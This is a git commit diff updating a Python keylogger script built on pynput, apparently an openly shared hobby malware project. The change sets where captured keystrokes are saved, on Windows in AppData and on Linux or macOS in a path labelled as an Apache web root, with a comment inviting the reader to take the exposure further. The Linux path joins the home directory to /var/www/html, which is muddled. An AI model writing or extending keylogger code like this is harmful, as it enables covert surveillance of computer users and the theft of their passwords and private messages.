64e29910e1f384bac2273f2f14a5ee1ed5b4b244
Tahmidul hoque <newquack3301@gmail.com>
2025-05-04 22:39:12 +0600

    Update keylogg.py

--- keylogg.py
+++ keylogg.py
@@ -1,7 +1,12 @@
 from pynput import keyboard
 import os
+import platform
 
-strokes = os.path.expanduser("~") + "\\AppData\\Roaming\\log.txt"  #This path is only for windows . If you are in linux then edit the path
+import platform
+if platform.system() == "Windows":
+    strokes = os.path.expanduser("~") + "\\AppData\\Roaming\\log.txt"
+else:  # For Linux or macOS
+    strokes = os.path.expanduser("~") + "/var/www/html/log.txt" # Path to apache2 server (you know what to do next enjoy)
 
 def on_press(key):
     try:
